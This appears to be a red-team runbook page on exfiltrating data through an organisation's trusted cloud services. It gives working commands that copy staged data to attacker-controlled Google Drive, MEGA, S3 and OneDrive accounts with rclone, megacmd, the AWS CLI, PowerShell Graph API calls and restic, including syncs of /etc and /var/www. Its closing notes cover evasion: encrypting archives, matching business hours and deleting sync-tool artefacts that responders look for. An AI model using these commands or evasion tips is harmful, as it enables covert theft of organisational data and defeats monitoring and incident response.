# Living-off-cloud exfiltration

Using the organisation's own approved cloud services and SaaS tools to
move data out. The fundamental insight: anything the organisation trusts
for data movement can be abused for data exfiltration. There is no clear
boundary between "legitimate business activity" and "exfiltration" when
both use the same tools and the same destinations.

## Why defenders struggle with this

A data loss prevention system that blocks transfers to unknown destinations
cannot block transfers to OneDrive, SharePoint, or Google Drive. Those are
approved services. A firewall that allows HTTPS traffic to Microsoft's and
Google's IP ranges cannot inspect what is uploaded to those services. The
organisation has effectively whitelisted the exfiltration channel in
advance.

Detection requires knowing what the organisation's data is doing within
these trusted services, which requires API monitoring, file access baselines,
and anomaly detection that most organisations have not implemented.

## Cloud storage sync tools

### Rclone

Rclone is a general-purpose cloud sync tool that supports S3, Google Drive,
OneDrive, Dropbox, SFTP, and dozens of other backends. It is used legitimately
by IT teams and is likely whitelisted or not monitored.

```bash
# configure multiple backends in a single config
rclone config create attacker-gdrive drive client_id CLIENT_ID \
  client_secret SECRET token '{"access_token":"TOKEN",...}'

# sync staged data silently
rclone copy /tmp/staged/ attacker-gdrive:exfil/ --quiet --no-check-dest

# disguise as a backup job with a plausible name
rclone sync /var/backups/app/ attacker-gdrive:app-backups/ --quiet &
```

### MEGAsync / MEGA client

The MEGA cloud storage client is often installed legitimately. If the
attacker has a MEGA account, the client can be used to sync a directory:

```bash
# megacmd: upload a directory
mega-login attacker@example.com PASSWORD
mega-mkdir /exfil
mega-put /tmp/staged/ /exfil/
mega-logout
```

### AWS CLI with attacker credentials

```bash
# configure attacker-controlled AWS profile
aws configure set aws_access_key_id ATTACKER_KEY --profile exfil
aws configure set aws_secret_access_key ATTACKER_SECRET --profile exfil
aws configure set region eu-west-1 --profile exfil

# upload staged files
aws s3 cp /tmp/staged.zip s3://attacker-bucket/out/staged.zip --profile exfil --quiet
```

## SaaS platforms as exfiltration channels

### SharePoint and OneDrive

If the attacker controls an Azure AD tenant (even a free one), they can
receive files via OneDrive:

```powershell
# upload directly via Graph API to attacker-controlled OneDrive
$headers = @{ Authorization = "Bearer $ATTACKER_TOKEN"; 'Content-Type' = 'application/octet-stream' }
$content = [System.IO.File]::ReadAllBytes('C:\Temp\staged.zip')
Invoke-RestMethod -Method PUT `
  -Uri 'https://graph.microsoft.com/v1.0/me/drive/root:/staged.zip:/content' `
  -Headers $headers `
  -Body $content
```

### Collaboration tools as data receivers

Send data from within the target environment to an external workspace where
the attacker can retrieve it. Covered in the
[covert channels runbook](../runbooks/covert-channels.md).

## Backup pipeline abuse

If the target's backup process writes to external storage, modifying the
backup configuration or injecting into the backup process gives persistent
exfiltration on a schedule:

```bash
# if backup runs rsync to an external host:
# add attacker-controlled host to the rsync destination
# or modify the rsync target path to include staged data

# if backup uses restic to an S3 bucket:
# add a second repository pointing to attacker-controlled bucket
restic -r s3:https://s3.amazonaws.com/attacker-bucket init --password-file /tmp/key
restic -r s3:https://s3.amazonaws.com/attacker-bucket backup /etc /var/www --quiet
```

## Operational notes

- Use compressed and encrypted archives before syncing: the content is
  opaque to any inspection that does not decrypt the archive
- Match transfer timing to normal business activity; do not run bulk uploads
  at 3am from an account that only ever operates during business hours
- Use a cloud account that has plausible cover: a personal OneDrive or Google
  Drive account cannot be blocked without blocking all consumer OneDrive traffic
- Clean up sync tool configuration files after use; these are artefacts that
  incident responders look for
